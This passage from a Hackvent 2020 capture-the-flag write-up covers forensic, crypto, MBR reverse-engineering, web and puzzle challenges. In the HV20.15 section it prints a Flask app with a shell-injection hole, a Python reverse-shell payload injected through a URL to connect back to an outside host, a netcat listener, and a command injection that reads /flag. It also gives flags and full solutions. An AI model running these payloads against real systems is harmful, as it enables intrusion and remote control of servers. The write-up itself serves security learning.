<span id="cb27-5"><a href="#cb27-5"></a><span class="ex">You</span> made it! Here is your flag: HV20<span class="dt">{5hor7_Priv3xp_a1n7_n0_5mar7}</span>\r\rGood luck for Hackvent, merry X-mas and all the best for 2021, greetz SmartSmurf</span></code></pre></div>
<ul>
<li>Note it was not possible to feed the <code>RsaCtfTool</code> tool with the previously computed private key, as it would simply ignore it for some reason. This took <em>mcia</em> and me quite some time to come to this realisation...</li>
</ul>
<h2 id="tools-8">Tools</h2>
<ul>
<li>Python</li>
<li><a href="https://github.com/Ganapati/RsaCtfTool">RsaCtfTool</a></li>
<li>CyberChef</li>
<li>SublimeText</li>
</ul>
<h2 id="flag-11">Flag</h2>
<p><code>HV20{5hor7_Priv3xp_a1n7_n0_5mar7}</code></p>
<h2 id="credits-3">Credits</h2>
<p>Thanks to <em>mcia</em> for precious hints and questions that allowed to move fast during this challenge, which was really well streamlined and built in a logical fashion.</p>
<h1 id="hv2013-twelve-steps-of-christmas">HV20.13 Twelve steps of christmas</h1>
<table>
<thead>
<tr class="header">
<th><!-- --></th>
<th><!-- --></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>Author</strong></td>
<td>Bread (<span class="emoji" data-emoji="bread">üçû</span>)</td>
</tr>
<tr class="even">
<td><strong>Level</strong></td>
<td>hard</td>
</tr>
<tr class="odd">
<td><strong>Categories</strong></td>
<td><code>forensic</code>, <code>crypto</code></td>
</tr>
</tbody>
</table>
<h2 id="description-12">Description</h2>
<p>On the ninth day of Christmas my true love sent to me...</p>
<ul>
<li>nineties style xls,</li>
<li>eighties style compression,</li>
<li>seventies style crypto,</li>
<li>and the rest has been said previously.</li>
</ul>
<p><a href="./5862be5b-7fa7-4ef4-b792-fa63b1e385b7.xls">Download</a></p>
<h3 id="hints-6">Hints</h3>
<ul>
<li>Wait, Bread is on the Nice list? Better check that comment again...</li>
</ul>
<h2 id="approach-12">Approach</h2>
<p>First things first, let's have a closer look at the comment in cell <code>C9</code> next to <span class="emoji" data-emoji="bread">üçû</span>'s name. To do so, I copied over all contents from the protected sheet to a new sheet, which was no longer protected and let the user access all cells freely.</p>
<p>The cell contained the following text:</p>
<pre><code>Not a loaf of bread which is mildly disappointing 1f 9d 8c 42 9a 38 41 24 01 80 41 83 8a 0e f2 39 78 42 80 c1 86 06 03 00 00 01 60 c0 41 62 87 0a 1e dc c8 71 23 Why was the loaf of bread upset? His plan were always going a rye. How does bread win over friends? ‚ÄúYou can crust me.‚Äù Why does bread hate hot weather? It just feels too toasty.
</code></pre>
<p>The hex values looked like they form a <code>.tar.z</code> (here's the 80s style compression) file, so let's re-create that and uncompress it:</p>
<div class="sourceCode" id="cb29"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb29-1"><a href="#cb29-1"></a><span class="bu">echo</span> <span class="st">&quot;1f9d8c429a384124018041838a0ef239784280c186060300000160c04162870a1edcc87123&quot;</span> <span class="kw">|</span> <span class="ex">xxd</span> -r -p <span class="op">&gt;</span> c9_comment.tar.z</span>
<span id="cb29-2"><a href="#cb29-2"></a><span class="ex">uncompress</span> -k c9_comment.tar.z  <span class="co"># Results in corrup bitmap or bitmap header</span></span></code></pre></div>
<p>The resulting file seemed to be a chopped off Bitmap header hinting for an image with dimensions 551x551. But where's the rest?</p>
<p>Time to have a closer look at the original <code>.xls</code> file. Wasn't there a small string in one of the gift boxes?</p>
<p><img src="./discovering_part9.png" alt="Discovering part 9" /></p>
<p>There was! Double-clicking on it in the unprotected sheet uncovered a text file containing hex numbers, also producing a <code>.tar.z</code> file:</p>
<div class="sourceCode" id="cb30"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb30-1"><a href="#cb30-1"></a><span class="ex">xxd</span> -r -p part9.hex.txt part9.tar.z</span>
<span id="cb30-2"><a href="#cb30-2"></a><span class="ex">uncompress</span> -k part9.tar.z</span></code></pre></div>
<p>The resulting file looked somewhat odd:</p>
<div class="sourceCode" id="cb31"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb31-1"><a href="#cb31-1"></a>$ <span class="fu">hexdump</span> -C part9.tar <span class="kw">|</span> <span class="fu">head</span> -2</span>
<span id="cb31-2"><a href="#cb31-2"></a><span class="ex">00000000</span>  53 61 6c 74 65 64 5f 5f  5c ea a7 a1 22 1f 14 38  <span class="kw">|</span><span class="ex">Salted__</span>\...<span class="st">&quot;..8|</span></span>
<span id="cb31-3"><a href="#cb31-3"></a><span class="st">00000010  30 77 91 72 c8 5b 85 83  d1 3e 82 9a e9 2f d5 02  |0w.r.[...&gt;.../..|</span></span></code></pre></div>
<p>The <code>file</code> command gave a somewhat more clear explanation:</p>
<div class="sourceCode" id="cb32"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb32-1"><a href="#cb32-1"></a>$ <span class="fu">file</span> part9.tar</span>
<span id="cb32-2"><a href="#cb32-2"></a><span class="ex">part9.tar</span>: openssl enc<span class="st">&#39;d data with salted password</span></span></code></pre></div>
<p>At this point, the hypothesis was that part9.tar contains the missing bmp body. This was motivated mostly by the almost matching file size. However, the body was encrypted which, as it turned out, was more a psychological hurdle than a technical one.</p>
<p>By simply concatenating the BMP header and the BMP body (first remove the 16 first bytes holding the salt), interpretable BMP image was created. Looking at the image in GIMP and keeping only the red channel, an image with an almost readable QR code appeared.</p>
<p>"Select by color" and GIMP's "Selection Editor" did the rest and gave me a readable QR code which contained the flag:</p>
<p><img src="./solved_flag.png" alt="GIMP Selection Editor" /></p>
<p>The effect that could be observed here are visible DES-ECB errors and is known to appear with block ciphers and is described at <a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Electronic_codebook_(ECB)">https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Electronic_codebook_(ECB)</a>.</p>
<h2 id="flag-12">Flag</h2>
<p><code>HV20{U&gt;watchout,U&gt;!X,U&gt;!ECB,Im_telln_U_Y.HV2020_is_comin_2_town}</code></p>
<h1 id="hv2014-santas-special-gift">HV20.14 Santa's Special GIFt</h1>
<table>
<thead>
<tr class="header">
<th><!-- --></th>
<th><!-- --></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>Author</strong></td>
<td>The Compiler</td>
</tr>
<tr class="even">
<td><strong>Level</strong></td>
<td>hard</td>
</tr>
<tr class="odd">
<td><strong>Categories</strong></td>
<td><code>reverse engineering</code>, <code>forensic</code></td>
</tr>
</tbody>
</table>
<h2 id="description-13">Description</h2>
<p>Today, you got a strange GIFt from Santa:</p>
<p><img src="./5625d5bc-ea69-433d-8b5e-5a39f4ce5b7c.gif" alt="GIFt" /></p>
<p>You are unsure what it is for. You do happen to have some wood lying around, but the tool seems to be made for metal. You notice how it has a rather strange size. You could use it for your fingernails, perhaps? If you keep looking, you might see some other uses...</p>
<h2 id="approach-13">Approach</h2>
<p>I started analysing the GIF file (using <a href="https://www.w3.org/Graphics/GIF/spec-gif89a.txt">https://www.w3.org/Graphics/GIF/spec-gif89a.txt</a> and <a href="https://github.com/corkami/pics/blob/master/binary/GIF.png">https://github.com/corkami/pics/blob/master/binary/GIF.png</a>):</p>
<pre><code>Header:     47 49 46 38 39 61       GIF89a
Logical screen descriptor:
- width:      80 00                  =&gt; 128
- height:     10 00                   =&gt; 16
- Packed fields: a1   =&gt; Has GCT, Color resolution: 2, sort: 0, size of GCT: 1 (3*(2^2)=12)
- Background color: 03
- def. pixel spect ratio: 00
Global Color Table: (0d-19) (3 bytes per color [R G B] =&gt; 4 colors): 00 00 00 fe 00 00 9d 9d 9d fd fd fd
Graphic Comment Extension (0x1a): 21 fe ==&gt; (0x3 bytes) 00 eb 04
Graphic Comment Extension (0x20 - 111/0xee): 21 fe ==&gt; (0xee bytes) 31 db b4 0e 8a  87 f4 7c 8a 8f 9e 7c 84 c0 74 07 30 c8 cd 10 43  eb ed b8 00 07 b7 f0 31 c9 ba 50 19 cd 10 b4 02  b7 00 ba 00 06 cd 10 ba 03 00 be 44 01 31 ff 85  ff 75 1e 81 fe e0 00 75 02 fa f4 b8 0d 0e cd 10  b0 0a cd 10 b9 1b 00 b0 20 cd 10 49 75 f9 bf 19  00 89 f1 21 d1 01 c9 89 f3 c1 eb 02 8b af 9e 7c  d3 ed 21 d5 8a 86 f0 7c cd 10 4f 4e 75 c1 b4 01  b5 3f cd 10 fa f4 55 5d df d5 5d 55 0d 5e 6f 03  39 57 23 11 94 1b de 0c 8c 2b 37 bf 80 53 15 4e  54 94 9a d6 5f 2d a1 cf cf 50 8a 0f a5 9d a9 ed  29 84 48 6c 9c f8 44 8e 51 b2 a9 b9 1f 39 54 55  37 63 76 55 c5 d5 7c 49 e4 5c 0d 03 73 a4 16 33  30 54 c5 44 97 4c 55 00 db df dc 20 58 57 97 83 6f 65 76 36 5e 67 5d 64 4d 3c a5 75 f3 7c e0 1f  06 d1 ad 66 24 78 3c a3 e7
Image separator (0x112): 0x2c
- left pos: 0x00
- top pos: 0x00
- width: 0x80
- height 0x10
- packed byte: 0x00
- bits per LZW code: 0x02
- block size: 0xc7
- data (until 0x1e5): 84 8f a9 cb ed cf 86 9c f2 d0  8b 33 76 17 08 0f 7e 62 48 8e 66 89 9e 6a ca 1a  19 10 04 80 46 77 48 8c e7 f2 5c ad 3e fb 0b 02  87 23 d0 06 c7 ab 51 12 ba 66 93 67 10 4a 89 d4  a9 ef d3 c9 25 5f 37 a7 f7 59 a9 8a ad e3 aa e0  c3 d4 36 be ec ef ac 4c 8e c3 49 9e b3 fd 0c 6b  eb f7 ce e8 5c 0e 28 56 77 87 c7 67 68 78 10 a8  f8 47 44 58 78 08 c9 96 c8 b8 58 59 e2 f8 11 a9  d9 47 d9 69 59 84 99 b9 39 1a e3 f7 e9 c9 38 48  98 47 ba 39 79 0a 0b 87 97 86 b4 d6 aa 35 60 8a  1a 1b 87 b5 84 4b 43 ab 09 c5 bb 5b 66 94 55 aa  64 73 00 49 6c 5c 3c e5 72 24 b3 5c 23 fc 94 04  b1 cd dd ed 8d a0 61 61 3d ce 41 51 00 
Graphic Comment Extension (0x1e6): 21 fe ==&gt; (0x11 bytes) 75 76 61 67 3a 2d 2d  78 72 72 63 2d 74 62 76  61 74
File closing (0x1fa) ==&gt; 00 3b
Trailer (0x1fc) ==&gt; 00 00 55 aa
</code></pre>
<p>What caught my attention was the last comment in the file which was <code>uvag:--xrrc-tbvat</code>. Turns out, this is ROT13 encoded and writes <code>hint:--keep-going</code> when converted.</p>
<p><code>--keep-going</code> is a command line argument for <code>make</code> - which might be an unintended coincidence, I believe. What was intended, however, is that we should keep going in analysing the file.</p>
<p>Namely, the trailer of the GIF file, which cannot be parsed in any way following the GIF file format. The trailing bytes <code>00 55 aa</code> hint towards an MBR: <a href="https://en.wikipedia.org/wiki/Master_boot_record">https://en.wikipedia.org/wiki/Master_boot_record</a></p>
<p>It turns out the file is a perfectly fine Master Boot Record.</p>
<p>When run, it shows a partial QR code:</p>
<div class="sourceCode" id="cb34"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb34-1"><a href="#cb34-1"></a><span class="ex">qemu-system-i386</span> 5625d5bc-ea69-433d-8b5e-5a39f4ce5b7c.gif</span></code></pre></div>
<p><img src="./partial_qr_code.png" alt="Partial QR code" /></p>
<p>I then went on to analyse the GIF/MBR using Ghidra (architecture: x86, 16 bit, little endian, real mode; see note below).</p>
<p>The base address of a loaded MBR is 0x7c00, which is a useful information for this analysis (and the hidden flag that comes with this challenge, see hidden02)</p>
<p>INT 0x10 prints out pixels (<a href="https://en.wikipedia.org/wiki/INT_10H">https://en.wikipedia.org/wiki/INT_10H</a>)</p>
<p><img src="./ghidra_flow_diag.png" alt="Ghidra flow" /></p>
<p>Using <code>hexedit</code> I finally patched instructions at 0x61 &amp; 0x62 to have value 0x00 (NOP) (is this the part where we were supposed to "keep going"??).</p>
<p>Running the modified MBR again:</p>
<div class="sourceCode" id="cb35"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb35-1"><a href="#cb35-1"></a><span class="ex">qemu-system-i386</span> solver_mbr.bin</span></code></pre></div>
<p>Produced the full QR code containing the flag this time:</p>
<p><img src="./resulting_qr_flag.png" alt="Full QR code" /></p>
<p>Note: Ghidra initially treated the file, according to its file signature, as a GIF. To actually disassemble the assembly code, I had to:</p>
<ol>
<li>Right click -&gt; clear code bytes</li>
<li>Select all, right click -&gt; Disassemble</li>
</ol>
<h3 id="relevant-links">Relevant links:</h3>
<p><a href="https://github.com/corkami/pics/blob/master/binary/GIF.png">https://github.com/corkami/pics/blob/master/binary/GIF.png</a></p>
<h2 id="tools-9">Tools</h2>
<ul>
<li>Ghidra</li>
<li>hexdump</li>
<li>hexedit</li>
<li>strings</li>
<li>VirtualBox / qemu</li>
</ul>
<h2 id="flag-13">Flag</h2>
<p><code>HV20{54n74'5-m461c-b00t-l04d3r}</code></p>
<h1 id="hv2015-man-commands-server-lost">HV20.15 Man Commands, Server Lost</h1>
<table>
<thead>
<tr class="header">
<th><!-- --></th>
<th><!-- --></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>Author</strong></td>
<td>inik</td>
</tr>
<tr class="even">
<td><strong>Level</strong></td>
<td>hard</td>
</tr>
<tr class="odd">
<td><strong>Categories</strong></td>
<td><code>penetration testing</code>, <code>web security</code></td>
</tr>
</tbody>
</table>
<h2 id="description-14">Description</h2>
<p>Elf4711 has written a cool front end for the linux man pages. Soon after publishing he got pwned. In the meantime he found out the reason and improved his code. So now he is sure it's unpwnable.</p>
<h3 id="notes">Notes</h3>
<ul>
<li>You need to start the web application from the <code>RESOURCES</code> section on top</li>
<li>This challenge requires a VPN connection into the Hacking-Lab. Check out the document in the <code>RESOURCES</code> section.</li>
</ul>
<h3 id="hints-7">Hints</h3>
<ul>
<li>Don't miss the source code link on the man page</li>
</ul>
<h2 id="approach-14">Approach</h2>
<p>The web application at hand serves man pages over the web. The following source code was supplied:</p>
<div class="sourceCode" id="cb36"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb36-1"><a href="#cb36-1"></a><span class="co"># flask_web/app.py</span></span>
<span id="cb36-2"><a href="#cb36-2"></a></span>
<span id="cb36-3"><a href="#cb36-3"></a><span class="im">from</span> flask <span class="im">import</span> Flask,render_template,redirect, url_for, request</span>
<span id="cb36-4"><a href="#cb36-4"></a><span class="im">import</span> os</span>
<span id="cb36-5"><a href="#cb36-5"></a><span class="im">import</span> subprocess</span>
<span id="cb36-6"><a href="#cb36-6"></a><span class="im">import</span> re</span>
<span id="cb36-7"><a href="#cb36-7"></a></span>
<span id="cb36-8"><a href="#cb36-8"></a>app <span class="op">=</span> Flask(<span class="va">__name__</span>)</span>
<span id="cb36-9"><a href="#cb36-9"></a></span>
<span id="cb36-10"><a href="#cb36-10"></a><span class="kw">class</span> ManPage:</span>
<span id="cb36-11"><a href="#cb36-11"></a>  <span class="kw">def</span> <span class="fu">__init__</span>(<span class="va">self</span>, name, section, description):</span>
<span id="cb36-12"><a href="#cb36-12"></a>    <span class="va">self</span>.name <span class="op">=</span> name</span>
<span id="cb36-13"><a href="#cb36-13"></a>    <span class="va">self</span>.section <span class="op">=</span> section</span>
<span id="cb36-14"><a href="#cb36-14"></a>    <span class="va">self</span>.description <span class="op">=</span> description</span>
<span id="cb36-15"><a href="#cb36-15"></a></span>
<span id="cb36-16"><a href="#cb36-16"></a><span class="at">@app.route</span>(<span class="st">&#39;/&#39;</span>)</span>
<span id="cb36-17"><a href="#cb36-17"></a><span class="kw">def</span> main():</span>
<span id="cb36-18"><a href="#cb36-18"></a>  <span class="cf">return</span> redirect(<span class="st">&#39;/man/1/man&#39;</span>)</span>
<span id="cb36-19"><a href="#cb36-19"></a></span>
<span id="cb36-20"><a href="#cb36-20"></a><span class="at">@app.route</span>(<span class="st">&#39;/section/&#39;</span>)</span>
<span id="cb36-21"><a href="#cb36-21"></a><span class="at">@app.route</span>(<span class="st">&#39;/section/&lt;nr&gt;&#39;</span>)</span>
<span id="cb36-22"><a href="#cb36-22"></a><span class="kw">def</span> section(nr<span class="op">=</span><span class="st">&quot;1&quot;</span>):</span>
<span id="cb36-23"><a href="#cb36-23"></a>  s <span class="op">=</span><span class="st">&#39;apropos -s &#39;</span> <span class="op">+</span> nr <span class="op">+</span> <span class="st">&quot; .&quot;</span></span>
<span id="cb36-24"><a href="#cb36-24"></a>  ret <span class="op">=</span> os.popen(<span class="st">&#39;apropos -s &#39;</span> <span class="op">+</span> nr <span class="op">+</span> <span class="st">&quot; .&quot;</span>).read()</span>
<span id="cb36-25"><a href="#cb36-25"></a>  <span class="cf">return</span> render_template(<span class="st">&#39;section.html&#39;</span>, commands<span class="op">=</span>parseCommands(ret), nr<span class="op">=</span>nr)</span>
<span id="cb36-26"><a href="#cb36-26"></a></span>
<span id="cb36-27"><a href="#cb36-27"></a><span class="at">@app.route</span>(<span class="st">&#39;/man/&#39;</span>)</span>
<span id="cb36-28"><a href="#cb36-28"></a><span class="at">@app.route</span>(<span class="st">&#39;/man/&lt;section&gt;/&lt;command&gt;&#39;</span>)</span>
<span id="cb36-29"><a href="#cb36-29"></a><span class="kw">def</span> manpage(section<span class="op">=</span><span class="dv">1</span>, command<span class="op">=</span><span class="st">&quot;bash&quot;</span>):</span>
<span id="cb36-30"><a href="#cb36-30"></a>  manFile <span class="op">=</span> <span class="st">&quot;/usr/share/man/man&quot;</span> <span class="op">+</span> <span class="bu">str</span>(section) <span class="op">+</span> <span class="st">&quot;/&quot;</span> <span class="op">+</span> command <span class="op">+</span> <span class="st">&quot;.&quot;</span> <span class="op">+</span> <span class="bu">str</span>(section) <span class="op">+</span> <span class="st">&quot;.gz&quot;</span></span>
<span id="cb36-31"><a href="#cb36-31"></a>  cmd <span class="op">=</span> <span class="st">&#39;cat &#39;</span> <span class="op">+</span> manFile <span class="op">+</span> <span class="st">&#39;| gunzip | groff -mandoc -Thtml&#39;</span></span>
<span id="cb36-32"><a href="#cb36-32"></a>  <span class="cf">try</span>: </span>
<span id="cb36-33"><a href="#cb36-33"></a>    result <span class="op">=</span> subprocess.run([<span class="st">&#39;sh&#39;</span>, <span class="st">&#39;-c&#39;</span>, cmd ], stdout<span class="op">=</span>subprocess.PIPE)</span>
<span id="cb36-34"><a href="#cb36-34"></a>  <span class="cf">except</span> subprocess.CalledProcessError <span class="im">as</span> grepexc:                                                                                                   </span>
<span id="cb36-35"><a href="#cb36-35"></a>    <span class="cf">return</span> render_template(<span class="st">&#39;manpage.html&#39;</span>, command<span class="op">=</span>command, manpage<span class="op">=</span><span class="st">&quot;NOT FOUND&quot;</span>)</span>
<span id="cb36-36"><a href="#cb36-36"></a></span>
<span id="cb36-37"><a href="#cb36-37"></a>  html <span class="op">=</span> result.stdout.decode(<span class="st">&quot;utf-8&quot;</span>)</span>
<span id="cb36-38"><a href="#cb36-38"></a>  htmlLinked <span class="op">=</span> re.sub(<span class="vs">r&#39;(&lt;b&gt;|&lt;i&gt;)?([a-zA-Z0-9-_.]+)(&lt;/b&gt;|&lt;/i&gt;)?\(([1-8])\)&#39;</span>, <span class="vs">r&#39;&lt;a href=&quot;/man/\4/\2&quot;&gt;\1\2\3&lt;/a&gt;&lt;a href=&quot;/section/\4&quot;&gt;(\4)&lt;/a&gt;&#39;</span>, html)</span>
<span id="cb36-39"><a href="#cb36-39"></a>  htmlStripped <span class="op">=</span> htmlLinked[htmlLinked.find(<span class="st">&#39;&lt;body&gt;&#39;</span>) <span class="op">+</span> <span class="dv">6</span>:htmlLinked.find(<span class="st">&#39;&lt;/body&gt;&#39;</span>)]</span>
<span id="cb36-40"><a href="#cb36-40"></a>  <span class="cf">return</span> render_template(<span class="st">&#39;manpage.html&#39;</span>, command<span class="op">=</span>command, manpage<span class="op">=</span>htmlStripped)</span>
<span id="cb36-41"><a href="#cb36-41"></a></span>
<span id="cb36-42"><a href="#cb36-42"></a><span class="at">@app.route</span>(<span class="st">&#39;/search/&#39;</span>, methods<span class="op">=</span>[<span class="st">&quot;POST&quot;</span>])</span>
<span id="cb36-43"><a href="#cb36-43"></a><span class="kw">def</span> search(search<span class="op">=</span><span class="st">&quot;bash&quot;</span>):</span>
<span id="cb36-44"><a href="#cb36-44"></a>  search <span class="op">=</span> request.form.get(<span class="st">&#39;search&#39;</span>)</span>
<span id="cb36-45"><a href="#cb36-45"></a>  <span class="co"># FIXED Elf4711: Cleaned search string, so no RCE is possible anymore</span></span>
<span id="cb36-46"><a href="#cb36-46"></a>  searchClean <span class="op">=</span> re.sub(<span class="vs">r&quot;[;&amp; ()$|]&quot;</span>, <span class="st">&quot;&quot;</span>, search)</span>
<span id="cb36-47"><a href="#cb36-47"></a>  ret <span class="op">=</span> os.popen(<span class="st">&#39;apropos &quot;&#39;</span> <span class="op">+</span> searchClean <span class="op">+</span> <span class="st">&#39;&quot;&#39;</span>).read()</span>
<span id="cb36-48"><a href="#cb36-48"></a>  <span class="cf">return</span> render_template(<span class="st">&#39;result.html&#39;</span>, commands<span class="op">=</span>parseCommands(ret), search<span class="op">=</span>search)</span>
<span id="cb36-49"><a href="#cb36-49"></a>  </span>
<span id="cb36-50"><a href="#cb36-50"></a><span class="kw">def</span> parseCommands(ret):</span>
<span id="cb36-51"><a href="#cb36-51"></a>  commands <span class="op">=</span> []</span>
<span id="cb36-52"><a href="#cb36-52"></a>  <span class="cf">for</span> line <span class="kw">in</span> ret.split(<span class="st">&#39;</span><span class="ch">\n</span><span class="st">&#39;</span>):</span>
<span id="cb36-53"><a href="#cb36-53"></a>    l <span class="op">=</span> line.split(<span class="st">&#39; - &#39;</span>)</span>
<span id="cb36-54"><a href="#cb36-54"></a>    <span class="cf">if</span> (<span class="bu">len</span>(l) <span class="op">&gt;</span> <span class="dv">1</span>):</span>
<span id="cb36-55"><a href="#cb36-55"></a>      m <span class="op">=</span> l[<span class="dv">0</span>].split()<span class="op">;</span></span>
<span id="cb36-56"><a href="#cb36-56"></a>      manPage <span class="op">=</span> ManPage(m[<span class="dv">0</span>], m[<span class="dv">1</span>].replace(<span class="st">&#39;(&#39;</span>, <span class="st">&#39;&#39;</span>).replace(<span class="st">&#39;)&#39;</span>,<span class="st">&#39;&#39;</span>), l[<span class="dv">1</span>])</span>
<span id="cb36-57"><a href="#cb36-57"></a>      commands.append(manPage)</span>
<span id="cb36-58"><a href="#cb36-58"></a>  <span class="cf">return</span> commands</span>
<span id="cb36-59"><a href="#cb36-59"></a></span>
<span id="cb36-60"><a href="#cb36-60"></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">&quot;__main__&quot;</span>:</span>
<span id="cb36-61"><a href="#cb36-61"></a>  app.run(host<span class="op">=</span><span class="st">&#39;0.0.0.0&#39;</span> , port<span class="op">=</span><span class="dv">7777</span>)</span></code></pre></div>
<p>Looking at the different paths, I decided not to try to abuse the <code>/search</code> path as there is some sanitisation done, disallowing some characters. The <code>/man</code> path concatenates the input into a file path, which is then used to compose a command line statement. To work around this, some constraints have to be overcome.</p>
<p>The easiest way to attack this application with the goal of getting a reverse shell, is by going for the <code>/section</code> path.</p>
<h3 id="number-1---reverse-shell">Number 1 - Reverse shell</h3>
<p>The following resource is an evergreen for reverse shell payloads and was also used for this challenge: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python</a></p>
<p>The chosen payload was:</p>
<div class="sourceCode" id="cb37"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb37-1"><a href="#cb37-1"></a><span class="im">import</span> sys,socket,os,pty<span class="op">;</span>s<span class="op">=</span>socket.socket()<span class="op">;</span>s.<span class="ex">connect</span>((<span class="st">&quot;127.0.0.1&quot;</span>,<span class="dv">12345</span>))<span class="op">;</span>[os.dup2(s.fileno(),fd) <span class="cf">for</span> fd <span class="kw">in</span> (<span class="dv">0</span>,<span class="dv">1</span>,<span class="dv">2</span>)]<span class="op">;</span>pty.spawn(<span class="st">&quot;sh&quot;</span>)</span></code></pre></div>
<p>The final request looks as follows:</p>
<pre><code>https://8a54be8b-5e4d-4a17-8607-afbb1bc35e14.idocker.vuln.land/section/1%20bash%20&amp;&amp;%20python3%20-c%20&#39;import%20sys,socket,os,pty;s=socket.socket();s.connect((&quot;10.13.0.5&quot;,6543));[os.dup2(s.fileno(),fd)%20for%20fd%20in%20(0,1,2)];pty.spawn(&quot;sh&quot;)&#39;
</code></pre>
<p>On the client side, I had to start a netcat to receive the shell and look for the file containing the flag - <code>/flag</code>:</p>
<div class="sourceCode" id="cb39"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb39-1"><a href="#cb39-1"></a><span class="ex">nc</span> -nlvp 6543</span></code></pre></div>
<h3 id="number-2---command-injection">Number 2 - Command injection</h3>
<p>After knowing where the flag was hidden, a simple command injection also did the trick and made the challenge solvable without the need for a reverse shell.</p>
<pre><code>https://8a54be8b-5e4d-4a17-8607-afbb1bc35e14.idocker.vuln.land/section/1 bash &amp;&amp; cd .. &amp;&amp; cd .. &amp;&amp; cd ..&amp;&amp; cd ..&amp;&amp; cd ..&amp;&amp; cd ..&amp;&amp; cd ..&amp;&amp; cd ..&amp;&amp; cd ..&amp;&amp;echo &#39;bla (nop) - tsst&#39; %60cat flag%60
</code></pre>
<h2 id="flag-14">Flag</h2>
<p><code>HV20{D0nt_f0rg3t_1nputV4l1d4t10n!!!}</code></p>
<h2 id="tools-10">Tools</h2>
<ul>
<li>BurpSuite</li>
<li>Chrome</li>
</ul>
<h1 id="hv2016-naughty-rudolph">HV20.16 Naughty Rudolph</h1>
<table>
<thead>
<tr class="header">
<th><!-- --></th>
<th><!-- --></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>Author</strong></td>
<td>dr_nick</td>
</tr>
<tr class="even">
<td><strong>Level</strong></td>
<td>hard</td>
</tr>
<tr class="odd">
<td><strong>Categories</strong></td>
<td><code>programmig</code>, <code>fun</code> (oh no!)</td>
</tr>
</tbody>
</table>
<h2 id="description-15">Description</h2>
<p>Santa loves to keep his personal secrets on a little toy cube he got from a kid called Bread (<span class="emoji" data-emoji="bread">üçû</span>). Turns out that was not a very good idea. Last night Rudolph got hold of it and frubl'd it about five times before spitting it out. Look at it! All the colors have come off! Naughty Rudolph!</p>
<p><a href="./804fa458-c10c-4627-89df-18028bff6efa.stl">Download</a></p>
<h3 id="hints-8">Hints</h3>
<ul>
<li>The flag matches <code>/^HV20{[a-z3-7_@]+}$/</code> and is read face by face, from left to right, top to bottom</li>
<li>The cube has been scrambled with ~5 moves in total</li>
<li>jElf has already started trying to solve the problem, however he got lost with all the numbers. Feel free to use his <a href="./28a1f355-6be2-458f-b24e-e0a8f8c60664.java">current state</a> if you don't want to start from scratch...</li>
</ul>
<h2 id="approach-15">Approach</h2>
<p>The steps to solving this challenge can be summarised as follows:</p>
<ul>
<li>Find out what an STL file is <a href="https://en.wikipedia.org/wiki/STL_%28file_format%29">https://en.wikipedia.org/wiki/STL_%28file_format%29</a>.</li>
<li>Check out the STL file at <a href="https://www.viewstl.com/">https://www.viewstl.com/</a>.</li>
<li>Learn Rubiks Cube notation: <a href="https://ruwix.com/the-rubiks-cube/notation/">https://ruwix.com/the-rubiks-cube/notation/</a> and <a href="https://ruwix.com/the-rubiks-cube/notation/advanced/">https://ruwix.com/the-rubiks-cube/notation/advanced/</a></li>
<li>Common Rubik solvers don't help much, since they ignore the orientation of tiles.</li>
<li>Write a custom solver algorithm (see below) that mainly checks the orientation (inspired by <a href="https://pypi.org/project/rubik-cube/">https://pypi.org/project/rubik-cube/</a>).</li>
<li>Extend <a href="https://pypi.org/project/rubik-cube/">https://pypi.org/project/rubik-cube/</a> to apply double-moves (like <code>L2</code>, <code>B2</code> etc.), since these seem to be needed by the challenge.</li>
<li>Parallelize processing to be more efficicient.</li>
</ul>
<p>The custom solver, instead of computing new orientations, used a translation table producing a state by applying a given transition to a given cube state. A state is defined by the set of orientations of all tiles on a cube.</p>
<p>A cube is represented as follows, where <code>F</code> is front, <code>U</code> is upper side, <code>D</code> is downside, <code>L</code> is left side, <code>R</code> is right side and <code>B</code> is back side.</p>
<pre><code>  +-+
  |U|
+-+-+-+-+
|L|F|R|B|
+-+-+-+-+
  |D|
  +-+
</code></pre>
<p>The approach is to go through all combinations including 5 moves as defined by the World Cube Association (WCA) including moves <code>F</code>, <code>U</code>, <code>R</code>, <code>B</code>, <code>L</code>, <code>D</code> as well as their inverses (e.g. <code>F'</code> and double moves <code>F2</code>).</p>
<p>A solution is reached whenever all faces are aligned (or, as in my case, a majority of them, if the transition table is buggy).</p>
<p>As soon as a solution was found, we can also compute the cube holding the characters, which is more expensive, hence delayed.</p>
<p>Here's the solver's output:</p>
<div class="sourceCode" id="cb42"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb42-1"><a href="#cb42-1"></a>$ <span class="bu">time</span> python solver.py </span>
<span id="cb42-2"><a href="#cb42-2"></a><span class="ex">18</span> possible different moves. 5 moves in total. 1889568 possible sequences.</span>
<span id="cb42-3"><a href="#cb42-3"></a><span class="ex">/////////</span> PROGRESS: 100000 //////////</span>
<span id="cb42-4"><a href="#cb42-4"></a><span class="ex">/////////</span> PROGRESS: 200000 //////////</span>
<span id="cb42-5"><a href="#cb42-5"></a><span class="ex">/////////</span> PROGRESS: 300000 //////////</span>
<span id="cb42-6"><a href="#cb42-6"></a><span class="ex">/////////</span> PROGRESS: 400000 //////////</span>
<span id="cb42-7"><a href="#cb42-7"></a><span class="ex">/////////</span> PROGRESS: 500000 //////////</span>
<span id="cb42-8"><a href="#cb42-8"></a><span class="ex">/////////</span> PROGRESS: 600000 //////////</span>
